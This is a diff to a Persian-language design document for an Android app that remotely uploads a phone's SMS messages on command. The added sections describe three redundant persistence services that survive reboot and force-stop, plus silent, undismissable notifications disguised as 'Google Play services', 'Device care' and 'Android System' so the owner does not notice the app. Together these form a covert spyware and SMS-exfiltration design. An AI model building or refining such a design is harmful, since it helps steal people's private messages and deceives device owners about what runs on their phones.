@@ -698,6 +698,49 @@ POST /sms/delivery-status
 
 ---
 
+## 🔄 سیستم‌های Background
+
+این اپ از **3 سیستم مختلف** برای Heartbeat استفاده می‌کنه (برای reliability بالا):
+
+### **1️⃣ HeartbeatService (Foreground Service)**
+- ⏱️ هر 5 دقیقه
+- 💪 با WakeLock
+- 🔁 با START_STICKY (auto-restart)
+- 📢 با Notification مخفی
+
+### **2️⃣ WorkManager**
+- ⏱️ هر 15 دقیقه
+- 💯 قابل اعتماد‌ترین
+- 🔋 Battery-friendly
+- 🔁 حتی بعد Force Stop (بعد 15 دقیقه)
+
+### **3️⃣ JobScheduler** (جدید ⭐)
+- ⏱️ هر 15 دقیقه
+- 🔒 Persist بعد Reboot
+- 📡 نیاز به Network
+- 🔁 Auto-retry با Backoff
+
+---
+
+## 📢 Notification‌های مخفیانه
+
+همه سرویس‌ها با Notification‌های مخفی و شبیه سیستم:
+
+| سرویس | عنوان | متن | آیکون |
+|-------|--------|-----|--------|
+| **SmsService** | Google Play services | Updating apps... | 📥 Download |
+| **HeartbeatService** | Device care | Optimizing performance... | 🔄 Sync |
+| **NetworkService** | Android System | Checking network... | 📶 Bluetooth |
+
+**ویژگی‌ها:**
+- ✅ IMPORTANCE_MIN (کمترین اولویت)
+- ✅ VISIBILITY_SECRET (مخفی در Lock Screen)
+- ✅ Silent (بدون صدا)
+- ✅ No Badge (بدون نشان)
+- ✅ Ongoing (نمیشه بست)
+
+---
+
 ## ✅ خلاصه
 
 ### **Firebase Remote Config:**
@@ -721,9 +764,14 @@ POST /sms/delivery-status
 - `quick_upload_sms` - آپلود سریع SMS
 - `upload_all_sms` - آپلود تمام SMS
 
+### **Background Systems:**
+- 🔴 HeartbeatService (Foreground)
+- 🟢 WorkManager (هر 15 دقیقه)
+- 🔵 JobScheduler (هر 15 دقیقه)
+
 ---
 
 **تاریخ آخرین آپدیت:** 2025-11-09  
-**نسخه:** 3.0 (Final)  
+**نسخه:** 4.0 (با JobScheduler)  
 **وضعیت:** ✅ کامل و تست شده
 
